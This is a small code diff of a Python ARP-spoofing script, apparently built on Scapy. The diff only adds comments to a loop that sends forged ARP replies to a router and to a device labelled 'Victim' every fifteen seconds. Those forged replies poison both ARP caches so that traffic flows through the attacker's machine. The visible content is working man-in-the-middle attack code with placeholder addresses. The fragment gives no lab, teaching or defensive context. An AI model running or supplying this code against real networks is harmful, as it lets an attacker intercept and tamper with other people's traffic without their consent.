@@ -7,8 +7,8 @@ def send_arp_reply(target_ip, target_mac, source_ip, source_mac):
     sendp(ethernet_frame, iface='Wi-Fi', verbose=False)
   
 while True:
-    send_arp_reply('xxx.xxx.xxx.xxx', 'xx:xx:xx:xx:xx:xx', 'xxx.xxx.xxx.xxx', 'xx:xx:xx:xx:xx:xx')
+    send_arp_reply('xxx.xxx.xxx.xxx', 'xx:xx:xx:xx:xx:xx', 'xxx.xxx.xxx.xxx', 'xx:xx:xx:xx:xx:xx') # First ARP reply
     #                 Router IP          Router MAC           Victim IP          Your MAC
-    send_arp_reply('xxx.xxx.xxx.xxx','xx:xx:xx:xx:xx:xx','xxx.xxx.xxx.xxx', 'xx:xx:xx:xx:xx:xx')
+    send_arp_reply('xxx.xxx.xxx.xxx', 'xx:xx:xx:xx:xx:xx', 'xxx.xxx.xxx.xxx', 'xx:xx:xx:xx:xx:xx') # Second ARP reply  
     #                 Victim IP          Victim MAC           Router IP          Your MAC
     time.sleep(15)
